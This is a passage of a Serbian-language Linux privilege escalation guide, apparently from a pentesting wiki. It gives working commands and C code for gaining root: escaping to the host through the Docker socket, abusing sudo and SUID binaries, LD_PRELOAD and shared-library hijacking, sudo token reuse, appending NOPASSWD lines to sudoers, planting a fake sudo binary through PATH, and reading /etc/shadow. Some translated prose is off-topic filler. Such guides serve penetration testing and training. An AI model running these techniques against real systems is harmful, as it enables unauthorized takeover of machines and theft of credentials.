Ako **identifikujete bilo koji upisiv soket** (_sada govorimo o Unix soketima, a ne o konfiguracionim `.socket` fajlovima_), onda **možete komunicirati** sa tim soketom i možda iskoristiti ranjivost.

### Enumeracija Unix soketa

```bash
netstat -a -p --unix
```

### Sirova veza

Ova tehnika se odnosi na uspostavljanje direktnog pristupa ciljnom sistemu putem mreže. To se može postići korišćenjem različitih alata i protokola kao što su SSH, Telnet ili RDP. Kada se uspostavi sirova veza, korisnik ima mogućnost da izvršava komande i manipuliše sistemom kao da je fizički prisutan na ciljnom računaru.

Da biste uspostavili sirovu vezu, potrebno je da znate IP adresu ciljnog sistema i da imate odgovarajuće autentifikacione podatke. Ova tehnika može biti korisna u situacijama kada želite da izvršite određene zadatke na ciljnom sistemu, kao što je preuzimanje ili brisanje fajlova, instalacija malicioznog softvera ili izvršavanje privilegovanog koda.

Važno je napomenuti da je korišćenje sirove veze ilegalno bez odobrenja vlasnika sistema. Ova tehnika se često koristi u etičkom hakovanju ili pentestiranju, gde se koristi sa ciljem identifikovanja slabosti u sistemu i preporučivanja odgovarajućih sigurnosnih mera.

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Primer eksploatacije:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTP soketi

Imajte na umu da mogu postojati neki **soketi koji slušaju HTTP** zahteve (_ne govorim o .socket fajlovima već o fajlovima koji deluju kao unix soketi_). Možete to proveriti sa:

```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```

Ako socket **odgovara sa HTTP** zahtevom, onda možete **komunicirati** sa njim i možda **iskoristiti neku ranjivost**.

### Writable Docker Socket

Docker socket, često se nalazi na putanji `/var/run/docker.sock`, je kritičan fajl koji treba da bude obezbeđen. Podrazumevano, on je dostupan za pisanje od strane korisnika `root` i članova grupe `docker`. Posedovanje pristupa pisanju na ovom socket-u može dovesti do eskalacije privilegija. Evo kako to može biti urađeno i alternativne metode ako Docker CLI nije dostupan.

#### **Eskalacija privilegija pomoću Docker CLI-a**

Ako imate pristup pisanju na Docker socket-u, možete eskalirati privilegije koristeći sledeće komande:

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Ove komande vam omogućavaju pokretanje kontejnera sa pristupom nivou root do fajl sistema domaćina.

#### **Korišćenje Docker API-ja direktno**

U slučajevima kada Docker CLI nije dostupan, Docker socket se i dalje može manipulisati korišćenjem Docker API-ja i `curl` komandi.

1. **Lista Docker slika:** Preuzmite listu dostupnih slika.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2. **Kreiranje kontejnera:** Pošaljite zahtev za kreiranje kontejnera koji montira koreni direktorijum sistema domaćina.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Pokrenite novo kreirani kontejner:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3. **Povezivanje sa kontejnerom:** Koristite `socat` za uspostavljanje veze sa kontejnerom, omogućavajući izvršavanje komandi unutar njega.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nakon uspostavljanja veze sa `socat`, možete izvršavati komande direktno u kontejneru sa pristupom nivou root do fajl sistema domaćina.

### Ostalo

Imajte na umu da ako imate dozvole za pisanje nad Docker socket-om jer ste **unutar grupe `docker`**, imate [**više načina za eskalaciju privilegija**](interesting-groups-linux-pe/#docker-group). Ako [**docker API sluša na portu** takođe možete biti u mogućnosti da ga kompromitujete](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Proverite **više načina za izlazak iz docker-a ili zloupotrebu za eskalaciju privilegija** u:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Eskalacija privilegija Containerd (ctr)

Ako otkrijete da možete koristiti komandu **`ctr`**, pročitajte sledeću stranicu jer **možda ćete moći da je zloupotrebite za eskalaciju privilegija**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## Eskalacija privilegija **RunC**

Ako otkrijete da možete koristiti komandu **`runc`**, pročitajte sledeću stranicu jer **možda ćete moći da je zloupotrebite za eskalaciju privilegija**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-Bus je sofisticiran **sistem interprocesne komunikacije (IPC)** koji omogućava aplikacijama efikasnu interakciju i deljenje podataka. Dizajniran sa modernim Linux sistemom na umu, pruža robustan okvir za različite oblike komunikacije aplikacija.

Sistem je fleksibilan i podržava osnovnu IPC koja poboljšava razmenu podataka između procesa, podsećajući na **unapređene UNIX domenske sokete**. Osim toga, pomaže u emitovanju događaja ili signala, podstičući besprekorno integrisanje između komponenti sistema. Na primer, signal od Bluetooth demona o dolaznom pozivu može naterati plejer za reprodukciju muzike da se stiša, poboljšavajući korisničko iskustvo. Pored toga, D-Bus podržava sistem udaljenih objekata, pojednostavljujući zahteve za usluge i pozive metoda između aplikacija, pojednostavljujući procese koji su tradicionalno bili kompleksni.

D-Bus radi na principu **dozvoli/odbijanja**, upravljajući dozvolama poruka (pozivi metoda, emitovanje signala itd.) na osnovu kumulativnog efekta odgovarajućih pravila politike. Ove politike definišu interakcije sa autobusom, potencijalno omogućavajući eskalaciju privilegija kroz iskorišćavanje ovih dozvola.

Primer takve politike u `/etc/dbus-1/system.d/wpa_supplicant.conf` pruža detalje o dozvolama za korisnika root da poseduje, šalje i prima poruke od `fi.w1.wpa_supplicant1`.

Politike bez navedenog korisnika ili grupe primenjuju se univerzalno, dok politike konteksta "default" važe za sve one koji nisu obuhvaćeni drugim specifičnim politikama.

```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Naučite kako da nabrojite i iskoristite D-Bus komunikaciju ovde:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **Mreža**

Uvek je interesantno nabrojati mrežu i utvrditi poziciju mašine.

### Generičko nabrojavanje

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```

### Otvoreni portovi

Uvek proverite mrežne servise koji se izvršavaju na mašini sa kojom niste mogli da komunicirate pre pristupa:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```

### Snifovanje

Proverite da li možete snifovati saobraćaj. Ako možete, možda ćete moći da prikupite neke akreditive.

```
timeout 1 tcpdump
```

## Korisnici

### Opšte nabrojavanje

Proverite **ko** ste, koje **privilegije** imate, koji **korisnici** su prisutni u sistemu, koji mogu **da se prijave** i koji imaju **root privilegije**:

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### Veliki UID

Neki Linux verzije su bile pogođene greškom koja omogućava korisnicima sa **UID > INT\_MAX** da povećaju privilegije. Više informacija: [ovde](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [ovde](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) i [ovde](https://twitter.com/paragonsec/status/1071152249529884674).\
**Iskoristite** to koristeći: **`systemd-run -t /bin/bash`**

### Grupe

Proverite da li ste **član neke grupe** koja vam može dati privilegije root-a:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### Clipboard

Proverite da li se unutar clipboard-a nalazi nešto interesantno (ako je moguće)

```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```

### Politika lozinki

Dobra politika lozinki je ključna za održavanje sigurnosti sistema. Evo nekoliko smernica koje treba pratiti prilikom postavljanja politike lozinki:

* **Dužina lozinke**: Lozinke treba da budu dovoljno dugačke kako bi bile teške za pogoditi. Preporučuje se minimalna dužina od 8 karaktera.
* **Složenost lozinke**: Lozinke treba da budu složene, kombinujući različite vrste karaktera kao što su velika slova, mala slova, brojevi i posebni znakovi.
* **Redovno menjanje lozinke**: Preporučuje se redovno menjanje lozinke, na primer svakih 90 dana, kako bi se smanjio rizik od neovlašćenog pristupa.
* **Nepređenje lozinke**: Korisnici ne smeju koristiti istu lozinku za više naloga ili je ponovo koristiti nakon određenog vremenskog perioda.
* **Blokiranje neuspešnih pokušaja prijavljivanja**: Implementirajte mehanizam koji će blokirati nalog nakon određenog broja neuspešnih pokušaja prijavljivanja kako bi se sprečili napadi pogađanjem lozinke.
* **Dvofaktorska autentifikacija**: Omogućite dvofaktorsku autentifikaciju kako biste dodatno zaštitili naloge. Ovo zahteva dodatni korak verifikacije, kao što je unos jednokratnog koda koji se šalje na mobilni telefon korisnika.
* **Edukacija korisnika**: Redovno obučavajte korisnike o važnosti snažnih lozinki i pravilnom upravljanju njima.

Primenom ovih smernica, možete poboljšati sigurnost sistema i smanjiti rizik od neovlašćenog pristupa.

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Poznate lozinke

Ako **znate bilo koju lozinku** za okruženje, pokušajte se prijaviti kao svaki korisnik koristeći tu lozinku.

### Su Brute

Ako vam ne smeta pravljenje puno buke i `su` i `timeout` binarni fajlovi su prisutni na računaru, možete pokušati napasti korisnike korišćenjem [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sa parametrom `-a` takođe pokušava napasti korisnike.

## Zloupotreba putanja sa dozvolom za pisanje

### $PATH

Ako otkrijete da možete **pisati unutar nekog foldera u $PATH-u**, možda ćete moći da dobijete privilegije tako što ćete **napraviti tajni ulaz unutar tog foldera za pisanje** sa imenom neke komande koja će biti izvršena od strane drugog korisnika (idealno root-a) i koja **nije učitana iz foldera koji se nalazi pre** vašeg foldera za pisanje u $PATH-u.

### SUDO i SUID

Možda vam je dozvoljeno izvršavanje neke komande koristeći sudo ili možda imaju postavljen suid bit. Proverite to koristeći:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Neki **neočekivani naredbe vam omogućavaju čitanje i/ili pisanje datoteka ili čak izvršavanje naredbe.** Na primer:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Konfiguracija sudo-a može omogućiti korisniku da izvrši određenu komandu sa privilegijama drugog korisnika, a da pritom ne mora uneti lozinku.

```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```

U ovom primeru korisnik `demo` može pokrenuti `vim` kao `root`, sada je jednostavno dobiti shell dodavanjem ssh ključa u root direktorijum ili pozivanjem `sh`.

```
sudo vim -c '!sh'
```

### SETENV

Ova direktiva omogućava korisniku da **postavi promenljivu okruženja** prilikom izvršavanja nečega:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Ovaj primer, **baziran na HTB mašini Admirer**, bio je **ranjiv** na **PYTHONPATH preusmeravanje** kako bi se učitala proizvoljna Python biblioteka prilikom izvršavanja skripte kao root:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### Bypassiranje izvršavanja sudo komande putem putanja

**Skoknite** da biste pročitali druge fajlove ili koristite **simboličke veze**. Na primer, u sudoers fajlu: _haker10 SVE= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Ako se koristi **wildcard** (\*), još je lakše:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Protivmere**: [https://blog.compass-security.com/2012/10/opasni-sudoers-unosi-deo-5-rekapitulacija/](https://blog.compass-security.com/2012/10/opasni-sudoers-unosi-deo-5-rekapitulacija/)

### Sudo komanda/SUID binarni fajl bez putanje komande

Ako je **sudo dozvola** dodeljena samo jednoj komandi **bez navođenja putanje**: _hacker10 ALL= (root) less_, možete je iskoristiti promenom PATH promenljive.

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Ova tehnika takođe može biti korišćena ako **suid** binarni fajl **izvršava drugu komandu bez navođenja putanje do nje (uvek proverite sadržaj čudnog SUID binarnog fajla pomoću** _**strings**_**)**.

[Primeri payloada za izvršavanje.](payloads-to-execute.md)

### SUID binarni fajl sa putanjom komande

Ako **suid** binarni fajl **izvršava drugu komandu navodeći putanju**, tada možete pokušati da **izvezete funkciju** nazvanu kao komanda koju suid fajl poziva.

Na primer, ako suid binarni fajl poziva _**/usr/sbin/service apache2 start**_, morate pokušati da kreirate funkciju i izvezete je:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Zatim, kada pozovete suid binarnu datoteku, ova funkcija će biti izvršena

### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

Okružena promenljiva **LD\_PRELOAD** se koristi da specificira jednu ili više deljenih biblioteka (.so fajlova) koje će biti učitane od strane loadera pre svih ostalih, uključujući standardnu C biblioteku (`libc.so`). Ovaj proces se naziva prethodno učitavanje biblioteke.

Međutim, kako bi se održala sigurnost sistema i sprečila zloupotreba ove funkcionalnosti, posebno sa **suid/sgid** izvršivim fajlovima, sistem primenjuje određene uslove:

* Loader ignoriše **LD\_PRELOAD** za izvršive fajlove gde stvarni korisnički ID (_ruid_) se ne podudara sa efektivnim korisničkim ID (_euid_).
* Za izvršne fajlove sa suid/sgid, samo biblioteke u standardnim putanjama koje su takođe suid/sgid se prethodno učitavaju.

Eskalacija privilegija može da se dogodi ako imate mogućnost izvršavanja komandi sa `sudo` i izlaz `sudo -l` uključuje izjavu **env\_keep+=LD\_PRELOAD**. Ova konfiguracija omogućava da okružena promenljiva **LD\_PRELOAD** ostane prisutna i bude prepoznata čak i kada se komande pokreću sa `sudo`, što potencijalno može dovesti do izvršavanja proizvoljnog koda sa povišenim privilegijama.

```
Defaults        env_keep += LD_PRELOAD
```

Sačuvaj kao **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

Zatim **kompajlirajte ga** koristeći:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Konačno, **povećaj privilegije** pokretanjem

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

{% hint style="danger" %}
Sličan privesc može biti zloupotrebljen ako napadač kontroliše **LD\_LIBRARY\_PATH** env varijablu jer kontroliše putanju gde će se biblioteke tražiti.
{% endhint %}

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID binarni fajl - .so ubacivanje

Kada naiđete na binarni fajl sa **SUID** dozvolama koji deluje neobično, dobra praksa je da proverite da li pravilno učitava **.so** fajlove. To možete proveriti pokretanjem sledeće komande:

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Na primer, susretanje sa greškom kao što je _"open(“/path/to/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (Nema takvog fajla ili direktorijuma)"_ ukazuje na potencijal za iskorišćavanje.

Da biste iskoristili ovo, trebali biste nastaviti tako što ćete kreirati C fajl, recimo _"/path/to/.config/libcalc.c"_, koji sadrži sledeći kod:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Ovaj kod, kada se kompajlira i izvrši, ima za cilj da poveća privilegije manipulacijom dozvola datoteka i izvršavanjem ljuske sa povećanim privilegijama.

Kompajlirajte gorenavedeni C fajl u deljenu objektnu (.so) datoteku koristeći:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Konačno, pokretanje pogođenog SUID binarnog fajla trebalo bi da pokrene eksploataciju, omogućavajući potencijalno kompromitovanje sistema.

## Hakovanje deljenog objekta

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Sada kada smo pronašli SUID binarnu datoteku koja učitava biblioteku iz foldera u kojem možemo pisati, kreirajmo biblioteku u tom folderu s potrebnim imenom:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```

Ako dobijete grešku kao što je

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

To znači da biblioteka koju ste generisali mora imati funkciju nazvanu `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) je kurirana lista Unix binarnih fajlova koje napadač može iskoristiti da zaobiđe lokalna sigurnosna ograničenja. [**GTFOArgs**](https://gtfoargs.github.io/) je isto to, ali za slučajeve kada možete **samo ubaciti argumente** u komandu.

Projekat prikuplja legitimne funkcije Unix binarnih fajlova koje mogu biti zloupotrebljene da bi se probile ograničene ljuske, eskalirale ili održavale privilegije, prenosile datoteke, pokretale bind i reverse ljuske i olakšavale druge zadatke nakon eksploatacije.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

Ako možete pristupiti `sudo -l`, možete koristiti alat [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) da proverite da li pronalazi način za iskorišćavanje bilo koje sudo pravila.

### Ponovna upotreba sudo tokena

U slučajevima kada imate **sudo pristup**, ali nemate lozinku, možete eskalirati privilegije tako što ćete **sačekati izvršavanje sudo komande, a zatim preuzeti sesijski token**.

Uslovi za eskalaciju privilegija:

* Već imate ljusku kao korisnik "_sampleuser_"
* "_sampleuser_" je **koristio `sudo`** da izvrši nešto u **poslednjih 15 minuta** (podrazumevano je trajanje sudo tokena koje nam omogućava korišćenje `sudo` bez unošenja lozinke)
* `cat /proc/sys/kernel/yama/ptrace_scope` je 0
* `gdb` je dostupan (možete ga preneti)

(Možete privremeno omogućiti `ptrace_scope` sa `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ili trajno izmeniti `/etc/sysctl.d/10-ptrace.conf` i postaviti `kernel.yama.ptrace_scope = 0`)

Ako su ispunjeni svi ovi uslovi, **možete eskalirati privilegije koristeći:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* **Prva eksploatacija** (`exploit.sh`) će kreirati binarni fajl `activate_sudo_token` u _/tmp_. Možete ga koristiti da **aktivirate sudo token u svojoj sesiji** (nećete automatski dobiti root ljusku, uradite `sudo su`):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

* Drugi eksploit (`exploit_v2.sh`) će kreirati sh shell u _/tmp_ direktorijumu **vlasništvo root korisnika sa setuid privilegijama**

```bash
bash exploit_v2.sh
/tmp/sh -p
```

* **Treći eksploit** (`exploit_v3.sh`) će **kreirati sudoers fajl** koji čini **sudo token-e večnim i omogućava svim korisnicima korišćenje sudo-a**.

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Korisničko ime>

Ako imate **dozvole za pisanje** u folderu ili na bilo kojoj od kreiranih datoteka unutar foldera, možete koristiti binarni fajl [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) da **kreirate sudo token za korisnika i PID**.\
Na primer, ako možete prebrisati datoteku _/var/run/sudo/ts/sampleuser_ i imate shell kao taj korisnik sa PID-om 1234, možete **dobiti sudo privilegije** bez potrebe da znate lozinku koristeći:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

Fajl `/etc/sudoers` i fajlovi unutar `/etc/sudoers.d` konfigurišu ko može koristiti `sudo` i kako. Ovi fajlovi **podrazumevano mogu biti čitani samo od strane korisnika root i grupe root**.\
**Ako** možete **čitati** ovaj fajl, možete **dobiti neke zanimljive informacije**, a ako možete **pisati** bilo koji fajl, možete **povećati privilegije**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Ako možete pisati, možete zloupotrebiti ovo ovlašćenje.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Još jedan način zloupotrebe ovih dozvola je:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

Postoje neke alternative za `sudo` binarni fajl kao što je `doas` za OpenBSD, ne zaboravite da proverite njegovu konfiguraciju u `/etc/doas.conf`

```
permit nopass demo as root cmd vim
```

### Sudo preuzimanje kontrole

Ako znate da **korisnik obično povezuje se na mašinu i koristi `sudo`** za preuzimanje privilegija, a vi imate shell unutar tog korisničkog konteksta, možete **kreirati novi sudo izvršni fajl** koji će izvršiti vaš kod kao root, a zatim korisnikovu komandu. Zatim, **izmenite $PATH** korisničkog konteksta (na primer, dodajte novi put u .bash\_profile) tako da kada korisnik izvrši sudo, izvršava se vaš sudo izvršni fajl.

Imajte na umu da ako korisnik koristi drugu ljusku (ne bash), moraćete izmeniti druge fajlove da biste dodali novi put. Na primer, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) menja `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Možete pronaći još jedan primer u [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)

Ili pokretanje nečega kao što je:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Deljena biblioteka

### ld.so

Datoteka `/etc/ld.so.conf` pokazuje **odakle se učitavaju konfiguracione datoteke**. Obično, ova datoteka sadrži sledeći put: `include /etc/ld.so.conf.d/*.conf`

To znači da će se čitati konfiguracione datoteke iz `/etc/ld.so.conf.d/*.conf`. Ove konfiguracione datoteke **pokazuju na druge direktorijume** u kojima će se **tražiti biblioteke**. Na primer, sadržaj `/etc/ld.so.conf.d/libc.conf` je `/usr/local/lib`. **Ovo znači da će sistem tražiti biblioteke unutar `/usr/local/lib`**.

Ako iz nekog razloga **korisnik ima dozvole za pisanje** na bilo kojem od navedenih puteva: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, bilo koja datoteka unutar `/etc/ld.so.conf.d/` ili bilo koji direktorijum unutar konfiguracione datoteke unutar `/etc/ld.so.conf.d/*.conf`, može doći do eskalacije privilegija.\
Pogledajte **kako iskoristiti ovu konfiguraciju** na sledećoj stranici:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```

Kopiranjem lib datoteke u `/var/tmp/flag15/`, program će je koristiti na tom mestu kako je navedeno u `RPATH` promenljivoj.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```

Zatim kreiraj zlu biblioteku u `/var/tmp` sa `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```

## Mogućnosti

Linux mogućnosti pružaju **podskup dostupnih privilegija root korisnika procesu**. Na taj način se privilegije root korisnika **razbijaju na manje i različite jedinice**. Svaka od ovih jedinica može biti nezavisno dodeljena procesima. Na taj način se smanjuje kompletni set privilegija, smanjujući rizik od zloupotrebe.\
Pročitajte sledeću stranicu da biste **saznali više o mogućnostima i kako ih zloupotrebiti**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## Dozvole direktorijuma

U direktorijumu, **bit "execute"** omogućava korisniku da se "**cd**" u folder.\
Bit **"read"** omogućava korisniku da **lista** **fajlove**, a bit **"write"** omogućava korisniku da **briše** i **kreira** nove **fajlove**.

## ACL-ovi

Access Control Lists (ACL-ovi) predstavljaju sekundarni sloj diskrecionih dozvola, sposobnih da **nadjačaju tradicionalne ugo/rwx dozvole**. Ove dozvole poboljšavaju kontrolu pristupa fajlovima ili direktorijumima omogućavajući ili zabranjujući prava određenim korisnicima koji nisu vlasnici ili deo grupe. Ovaj nivo **granularnosti omogućava preciznije upravljanje pristupom**. Dodatne detalje možete pronaći [**ovde**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Dodelite** korisniku "kali" dozvole za čitanje i pisanje nad fajlom:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Dobijanje** fajlova sa određenim ACL-ovima sa sistema:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

## Otvorene sesije ljuske

U **starijim verzijama** možete **preuzeti kontrolu** nad nekom **sesijom ljuske** drugog korisnika (**root**).\
U **najnovijim verzijama** možete se povezati samo na sesije ekrana **svojeg korisnika**. Međutim, možete pronaći **zanimljive informacije unutar sesije**.

### Preuzimanje kontrola nad sesijama ekrana

**Izlistajte sesije ekrana**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```

**Povezivanje na sesiju**

Da biste se povezali na sesiju, koristite sledeću komandu:

```bash
tmux attach-session -t <ime_sesije>
```

Gde `<ime_sesije>` predstavlja ime sesije na koju želite da se povežete.

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
